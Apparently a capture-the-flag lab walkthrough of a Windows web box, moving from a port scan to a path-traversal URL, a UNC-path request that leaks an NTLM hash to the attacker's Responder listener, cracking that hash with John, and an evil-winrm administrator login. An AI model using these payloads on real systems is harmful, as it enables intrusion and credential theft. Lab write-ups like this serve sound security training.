# 1.Port Scan
ip=10.129.166.236
nmap -p- --min-rate=5000 -sV $ip

![ce8fc0056d5195820fdb48e66a1cf677.png](../_resources/ce8fc0056d5195820fdb48e66a1cf677.png)


# 2.UNIKA.HTB Connect
`sudo vim /etc/hosts`


![d76c3f001e66f51224c55562e7d80b95.png](../_resources/d76c3f001e66f51224c55562e7d80b95.png)
![2c5521632745e9a44caf928311eb38f6.png](../_resources/2c5521632745e9a44caf928311eb38f6.png)

# 3.Directory Search

![13d3b79ca03132a64984f2452f11132b.png](../_resources/13d3b79ca03132a64984f2452f11132b.png)

**http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts**
![340d685f495a558be3468a15235b6029.png](../_resources/340d685f495a558be3468a15235b6029.png)

# 4.Responder
`sudo responder -I tun0`

![f016cfb5be89d163a6a1da1bc87cf401.png](../_resources/f016cfb5be89d163a6a1da1bc87cf401.png)

## WEB Request 
![ff4c67dffdd1311d1892c45cfa21a497.png](../_resources/ff4c67dffdd1311d1892c45cfa21a497.png)
**http://unika.htb/index.php?page=//10.10.16.8/testShare**


## Hash get
![40fe3900139913018ad99d020f9b6e3c.png](../_resources/40fe3900139913018ad99d020f9b6e3c.png)


# 5.Password Crack
`John -wordlist=/home/kali/rockyou2 /home/kali/hash.txt`

![6c9d8534d33ade861c741f8b79ff39da.png](../_resources/6c9d8534d33ade861c741f8b79ff39da.png)

# 6.Flag get
`evil-winrm -i $ip -u administrator -p badminton`   

![e84057e576fd8d95ed36c8e80512a7b8.png](../_resources/e84057e576fd8d95ed36c8e80512a7b8.png)

![9cbd3e57f13ba7be580b7cf4ef9326da.png](../_resources/9cbd3e57f13ba7be580b7cf4ef9326da.png)
